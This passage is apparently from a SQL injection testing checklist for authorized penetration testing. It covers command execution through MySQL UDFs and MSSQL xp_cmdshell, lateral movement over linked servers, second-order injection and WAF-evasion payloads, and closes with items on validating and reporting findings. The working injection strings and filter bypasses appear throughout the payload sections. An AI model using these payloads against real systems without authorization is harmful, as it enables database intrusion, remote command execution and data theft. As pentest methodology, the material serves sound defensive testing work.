**Expected Result:** A single benign command executes via the UDF/scheduler.

**Payload Example:**

```
SELECT sys_exec('id');   -- MySQL UDF
BEGIN DBMS_SCHEDULER.CREATE_JOB(...); END;   -- Oracle
```

**Impact:** RCE on MySQL/Oracle where privileges allow - Critical.

**Tools:** Burp Repeater, sqlmap, metasploit

**References:** CWE-89; CWE-78; HackTricks SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-035 — Privilege check (DBA/superuser)
**Test Category:** Impact — Privilege &amp; Lateral · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** Confirmed SQLi, any DBMS

**Test Steps:** 1. MySQL: super_priv from mysql.user / current_user().<br>2. PG: current_setting('is_superuser').<br>3. MSSQL: IS_SRVROLEMEMBER('sysadmin').<br>4. Oracle: session_privs for DBA.

**Expected Result:** The current DB user's privilege level (DBA/superuser or not) is determined.

**Payload Example:**

```
' AND IS_SRVROLEMEMBER('sysadmin')=1-- -
' AND (SELECT current_setting('is_superuser'))='on'-- -
```

**Impact:** Determines whether file R/W and RCE are reachable - sets the severity ceiling.

**Tools:** Burp Repeater, sqlmap --privileges

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection

---

## SQLI-036 — Lateral movement — MSSQL linked servers
**Test Category:** Impact — Privilege &amp; Lateral · **Severity:** High · **CVSS:** 8.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L)

**Where to Test / Injection Point:** MSSQL with linked servers configured

**Test Steps:** 1. Enumerate linked servers.<br>2. OPENQUERY to run on the linked instance: SELECT * FROM OPENQUERY([LINKEDSRV],'SELECT @@version').<br>3. EXEC ... AT [LINKEDSRV] for RCE; document reach without pivoting out of scope.

**Expected Result:** Queries/commands execute on a linked SQL server, revealing lateral reach.

**Payload Example:**

```
'; SELECT * FROM OPENQUERY([LINKEDSRV],'SELECT @@version')-- -
'; EXEC ('xp_cmdshell ''whoami''') AT [LINKEDSRV]-- -
```

**Impact:** Lateral movement across the SQL estate - can chain to RCE on other hosts.

**Tools:** Burp Repeater, mssqlclient.py

**References:** CWE-89; HackTricks SQL injection

---

## SQLI-037 — Second-order SQLi
**Test Category:** Impact — Second-Order · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stored field later used unsafely by another feature (admin search/report)

**Test Steps:** 1. Plant a time/OOB payload in a stored field (username, address, filename).<br>2. Trigger the consumer (admin search, report, batch job).<br>3. Confirm the delay/callback fires when the stored value is queried.

**Expected Result:** The payload stored earlier executes when a later feature builds a query from it.

**Payload Example:**

```
register username = tester' AND SLEEP(5)-- -   then trigger admin search of users
```

**Impact:** Bypasses input-facing WAFs and often runs at higher privilege - high-impact, hard to detect.

**Tools:** Burp Collaborator, manual

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-038 — Keyword-filter evasion (UNION/SELECT)
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** WAF/filter blocking SQL keywords

**Test Steps:** 1. Inline comments: UN/**/ION, SE/**/LECT; MySQL versioned /*!50000UNION*/.<br>2. Case: uNiOn SeLeCt.<br>3. Doubled keyword if the WAF strips once: UNIUNIONON.

**Expected Result:** The obfuscated keyword reaches the DB and executes though the raw keyword is blocked.

**Payload Example:**

```
' UN/**/ION SE/**/LECT NULL-- -
' /*!50000UNION*/ /*!SELECT*/ NULL-- -
```

**Impact:** Bypasses signature WAFs to restore UNION/extraction on 'protected' endpoints.

**Tools:** Burp Repeater, sqlmap --tamper

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-039 — Whitespace &amp; quote/encoding evasion
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Filters blocking spaces or quotes

**Test Steps:** 1. Space blocked: /**/, %09/%0a/%0b/%0c/%0d, or UNION(SELECT(1)).<br>2. Quote blocked: hex 0x61646d696e, CHAR()/CHR() per DBMS.<br>3. Double-encode %2527 where the stack decodes twice.

**Expected Result:** The payload survives the filter via alternative whitespace/encoding and still executes.

**Payload Example:**

```
' OR 0x61646d696e=0x61646d696e-- -
'/**/OR/**/1=1-- -
id=1%09AND%091=1
```

**Impact:** Defeats space/quote filters that block only the literal characters.

**Tools:** Burp Repeater, CyberChef, sqlmap --tamper

**References:** CWE-89; PayloadsAllTheThings/SQL Injection

---

## SQLI-040 — Logic/comparison variety (= blocked)
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Filters blocking = or common boolean forms

**Test Steps:** 1. Replace =: LIKE, &lt;&gt;, BETWEEN, IN, &gt;, &lt;.<br>2. Vary truth: ' OR 'a'='a -&gt; ' OR 2&gt;1 -&gt; ' OR 1 IN (1).<br>3. AND-&gt;&amp;&amp; , OR-&gt;|| (MySQL).

**Expected Result:** An equivalent comparison bypasses the blocked operator and preserves the boolean logic.

**Payload Example:**

```
' OR 'a' LIKE 'a'-- -
' OR 2>1-- -
' OR 1 IN (1)-- -
```

**Impact:** Keeps boolean/auth-bypass injections working when '=' or 'OR 1=1' is filtered.

**Tools:** Burp Repeater

**References:** CWE-89; PayloadsAllTheThings/SQL Injection

---

## SQLI-041 — HPP, identifier-slot &amp; second-order as WAF bypass
**Test Category:** Evasion — WAF/Filter · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Front-end parameterized or response-diff normalized by WAF/cache

**Test Steps:** 1. HTTP parameter pollution: id=1&amp;id=2 (some stacks concat duplicates).<br>2. If values are bound, hunt the identifier/sort slot (raw column name).<br>3. Store where the WAF doesn't inspect, trigger later (second-order).<br>4. If response-diff is normalized, switch to TIME (delay survives).

**Expected Result:** A path the WAF does not inspect (duplicate param, sort slot, stored value, timing) carries the injection.

**Payload Example:**

```
id=1&id=2
?sort=(SELECT ... )
store payload -> trigger admin consumer
```

**Impact:** Bypasses WAFs and 'mostly parameterized' apps by attacking the slots they don't protect.

**Tools:** Burp Repeater, sqlmap --tamper

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; PayloadsAllTheThings/SQL Injection

---

## SQLI-042 — False-positive filter &amp; benign-proof discipline
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject non-findings: a lone 500/stack-trace with no query change; a reflected SQL error string (info leak, not injection); a single length blip (caching/jitter); 'sqlmap flagged it' with no hand proof; a slow endpoint with no SLEEP(5) vs SLEEP(0) control; $ne/$gt (that's NoSQL).<br>2. Require the QUERY to demonstrably change (other rows / true-false / delay / DNS hit / version / whoami).<br>3. Re-test oracles several times; reproduce by hand; confirm DBMS + technique. Never run destructive proof.

**Expected Result:** A reproducible query-behaviour change tied to your payload - not an error, blip, or tool flag.

**Payload Example:**

```
AND 1=1 vs AND 1=2 stable; SLEEP(5) vs SLEEP(0) controlled; hand-reproduced.
```

**Impact:** Protects credibility and avoids self-DoS/destructive actions; separates real SQLi from noise.

**Tools:** Burp, manual verification

**References:** CWE-89; PortSwigger Web Security Academy: SQL injection; OWASP WSTG-INPV-05

---

## SQLI-043 — Client-facing impact &amp; PoC package (CWE-89 + CVSS)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest impact on the sink (RCE &gt; auth bypass &gt; dump).<br>2. Provide exact request, context, DBMS, technique, and benign proof (version()+1 row / whoami / DNS hit).<br>3. Set CVSS 3.1 + CWE-89 (+ CWE-287 auth bypass / CWE-78 RCE). Remediation: parameterized queries/prepared statements, allowlist identifier/sort inputs, least-privilege DB user, disable xp_cmdshell/local_infile, WAF as defence-in-depth.<br>4. De-dupe to one finding per sink.

**Expected Result:** A reproducible, correctly-rated, benign PoC with clear remediation.

**Payload Example:**

```
PoC: request + benign proof (version/whoami/DNS) + CVSS + CWE-89 + fix guidance.
```

**Impact:** Converts the finding into a defensible, actionable report at the correct severity.

**Tools:** Burp, CVSS calculator, SQL_INJECTION_REPORT_TEMPLATE.md

**References:** CWE-89; CWE-287; CWE-78; FIRST CVSS v3.1  |  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; OWASP; sqlmap wiki; academic SQLi research

---
